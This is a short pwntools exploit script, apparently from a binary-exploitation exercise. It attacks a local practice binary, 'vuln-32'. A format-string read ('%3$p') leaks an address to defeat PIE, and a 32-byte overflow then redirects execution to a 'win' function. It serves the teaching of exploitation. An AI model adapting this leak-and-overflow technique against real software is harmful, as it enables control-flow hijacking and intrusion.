from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

log.info(p.clean())
p.sendline(b'%3$p')
p.recvuntil('you ')
elf_leak = int(p.recvline(), 16)
log.success(f'Got leak: {hex(elf_leak)}')

elf.address = elf_leak - 0x11d5

payload = b'x'*32 + p32(elf.sym['win']) + p32(0x0)
log.info(p.clean())
p.sendline(payload)
log.success(p.clean())
